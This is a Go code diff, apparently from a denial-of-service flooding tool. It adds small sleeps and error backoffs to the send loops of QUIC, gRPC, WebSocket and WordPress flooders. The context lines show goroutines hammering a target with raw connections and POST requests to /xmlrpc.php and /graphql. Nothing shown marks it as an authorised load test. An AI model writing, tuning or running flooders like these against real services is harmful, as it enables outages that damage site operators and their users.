@@ -46,6 +46,7 @@ func (q *QUICFlooder) Run(done chan struct{}) {
 				pkt := buildQUICInitial()
 				conn.Write(pkt)
 				q.sent.Add(1)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -135,11 +136,13 @@ func (g *GRPCFlooder) Run(done chan struct{}) {
 				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
 				if err != nil {
 					g.errors.Add(1)
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				conn.Write(buildGRPCUnaryFrame())
 				conn.Close()
 				g.sent.Add(1)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -218,6 +221,7 @@ func (ws *WebSocketFlooder) Run(done chan struct{}) {
 				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
 				if err != nil {
 					ws.errors.Add(1)
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				key := randStr(16)
@@ -236,6 +240,7 @@ func (ws *WebSocketFlooder) Run(done chan struct{}) {
 				}
 				conn.Close()
 				ws.sent.Add(1)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
@@ -296,6 +301,7 @@ func (wp *WordPressFlooder) Run(done chan struct{}) {
 				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
 				if err != nil {
 					wp.errors.Add(1)
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				req := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", wp.target, xmlLen, xmlPayload)
@@ -305,12 +311,14 @@ func (wp *WordPressFlooder) Run(done chan struct{}) {
 				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
 				if err != nil {
 					wp.errors.Add(1)
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				req2 := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", wp.target, graphqlLen, graphqlPayload)
 				conn2.Write([]byte(req2))
 				conn2.Close()
 				wp.sent.Add(1)
+				time.Sleep(time.Microsecond)
 			}
 		}()
 	}
